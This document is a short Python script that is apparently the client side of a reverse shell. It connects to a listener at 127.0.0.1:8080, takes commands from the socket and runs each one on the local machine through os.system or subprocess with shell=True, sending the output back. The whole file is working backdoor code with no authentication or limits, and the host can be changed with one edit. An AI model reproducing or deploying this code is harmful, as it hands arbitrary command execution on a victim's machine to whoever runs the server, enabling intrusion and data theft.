import socket
import os
import subprocess

host = '127.0.0.1'
port = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))


def send_error(msg):
    error_msg = f'[From client] Error: {msg}'
    client.send(error_msg.encode())


while True:
    try:
        comm = client.recv(1024).decode()
        if comm == 'close':
            break
        elif not comm:
            break
        elif comm[:3] == 'cd ':
            try:
                os.chdir(comm[3:])
            except FileNotFoundError as e:
                send_error(e)
        elif comm[:5] == 'touch':
            os.system(comm)
        elif comm[:5] == 'mkdir':
            os.system(comm)
        elif comm[:5] == 'start':
            os.system(comm)
        elif comm[:4] == 'open':
            os.system(comm) 
        else:
            try:
                output = subprocess.run(comm, text=True, shell=True, capture_output=True)
                if output.stdout:
                    client.sendall(output.stdout.encode())
                else:
                    client.sendall('\nNO OUTPUT!'.encode())
            except subprocess.CalledProcessError as e:
                send_error(e)
            except (ValueError, TypeError, AttributeError) as e:
                send_error(e)
    except socket.error as e:
        send_error(e)
        
client.close()


